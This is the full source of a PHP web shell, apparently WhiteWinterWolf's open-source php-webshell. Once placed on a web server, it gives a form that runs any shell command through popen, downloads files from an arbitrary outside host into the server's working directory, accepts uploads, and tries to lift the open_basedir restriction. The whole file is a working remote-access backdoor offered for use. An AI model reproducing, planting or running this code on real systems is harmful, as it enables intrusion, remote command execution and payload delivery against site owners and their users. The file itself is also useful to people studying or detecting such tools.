<?php

/* https://github.com/WhiteWinterWolf/php-webshell
 * Copyright 2017 WhiteWinterWolf
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

while (@ ob_end_clean());
error_reporting(E_ALL);

$uri = $_SERVER["REQUEST_URI"];
$fetch_host =  empty($_POST["fetch_host"]) ? $_SERVER["REMOTE_ADDR"] : $_POST["fetch_host"];
$fetch_port = empty($_POST["fetch_port"]) ? "80" : $_POST["fetch_port"];
$fetch_path = $_POST["fetch_path"];
$cwd = empty($_POST["cwd"]) ? getcwd() : $_POST["cwd"];
$cmd = $_POST["cmd"];
$url_html = htmlspecialchars($url, ENT_QUOTES, "UTF-8");
$fetch_host_html = htmlspecialchars($fetch_host, ENT_QUOTES, "UTF-8");
$fetch_port_html = htmlspecialchars($fetch_port, ENT_QUOTES, "UTF-8");
$fetch_path_url = htmlspecialchars($fetch_path, ENT_QUOTES, "UTF-8");
$cwd_html = htmlspecialchars($cwd, ENT_QUOTES, "UTF-8");
$cmd_html = htmlspecialchars($cmd, ENT_QUOTES, "UTF-8");
$status = "";
$ok = "&#9786; :";
$warn = "&#9888; :";
$err = "&#9785; :";

if (ini_get("open_basedir") && ! ini_set("open_basedir", ""))
{
	$status .= "${warn} open_basedir = " . ini_get("open_basedir") . "<br />";
}
if (! ini_get("file_uploads"))
{
	ini_set("file_uploads", "on");
}

if (! chdir($cwd))
{
  $cwd = getcwd();
  $cwd_html = htmlspecialchars($cwd, ENT_QUOTES, "UTF-8");
}

if (! empty($fetch_path))
{
	$s = fsockopen($fetch_host, $fetch_port);
	if ($s)
	{
		$dest = $cwd . DIRECTORY_SEPARATOR . basename($fetch_path);
		$f = fopen($dest, "wb");
		if ($f)
		{
			$buf = "";
			$r = array($s);
			$w = NULL;
			$e = NULL;
			fwrite($s, "GET ${fetch_path} HTTP/1.0\r\n\r\n");
			while (stream_select($r, $w, $e, 5) && !feof($s))
			{
				$buf .= fread($s, 1024);
			}
			$buf = substr($buf, strpos($buf, "\r\n\r\n") + 4);
			fputs($f, $buf);
			fclose($f);
			$status .= "${ok} Fetched file <i>${dest}</i> (" . strlen($buf) . " bytes)<br />";
		}
		else
		{
			$status .= "${err} Failed to open file <i>${dest}</i><br />";
		}
		fclose($s);
	}
	else
	{
		$status .= "${err} Failed to connect to <i>${fetch_host}:${fetch_port}</i><br />";
	}
}

if (! empty($_FILES["upload"]))
{
	$dest = $cwd . DIRECTORY_SEPARATOR . basename($_FILES["upload"]["name"]);
	if (move_uploaded_file($_FILES["upload"]["tmp_name"], $dest))
	{
		$status .= "${ok} Uploaded file <i>${dest}</i> (" . $_FILES["upload"]["size"] . " bytes)<br />";
	}
}
?>

<form method="post" action="<?php echo $url_html; ?>" enctype="multipart/form-data">
	<table border="0">
		<tr><td>
			<b>Fetch:</b>
		</td><td>
			host: <input type="text" size="15" id="fetch_host" name="fetch_host" value="<?php echo $fetch_host_html; ?>">
			port: <input type="text" size="4" id="fetch_port" name="fetch_port" value="<?php echo $fetch_port_html; ?>">
			path: <input type="text" size="40" id="fetch_path" name="fetch_path" value=""><br />
		</td></tr>
		<tr><td>
			<b>CWD:</b>
		</td><td>
			<input type="text" size="50" id="cwd" name="cwd" value="<?php echo $cwd_html; ?>">
			<?php if (ini_get("file_uploads")): ?>
				<b>Upload:</b> <input type="file" id="upload" name="upload"><br />
			<?php else: ?>
				File uploads disabled.<br />
			<?php endif ?>
		</td></tr>
		<tr><td>
			<b>Cmd:</b>
		</td><td>
			<input type="text" size="80" id="cmd" name="cmd" value="<?php echo $cmd_html; ?>"><br />
		</td></tr>
		<tr><td>
		</td><td>
			<sup><a href="#" onclick="cmd.value='';cmd.focus(); return false;">Clear cmd</a></sup>
		</td></tr>
		<tr><td colspan="2" style="text-align: center;">
			<input type="submit" value="Execute" style="text-align: right;">
		</td></tr>
	</table>
	
</form>
<hr />

<?php
if (! empty($status))
{
	echo "<p>${status}</p>";
}

echo "<pre>";
if (! empty($cmd))
{
	echo "<b>" . $cmd_html . "</b>\n";
	if (DIRECTORY_SEPARATOR == '/')
	{
		$p = popen("exec 2>&1; " . $cmd, 'r');
	}
	else
	{
		$p = popen("cmd /C " . $cmd . " 2>&1", 'r');
	}
	while (! feof($p))
	{
		echo htmlspecialchars(fread($p, 4096), ENT_QUOTES, 'UTF-8');
		@ flush();
	}
}
echo "</pre>";

exit;
?>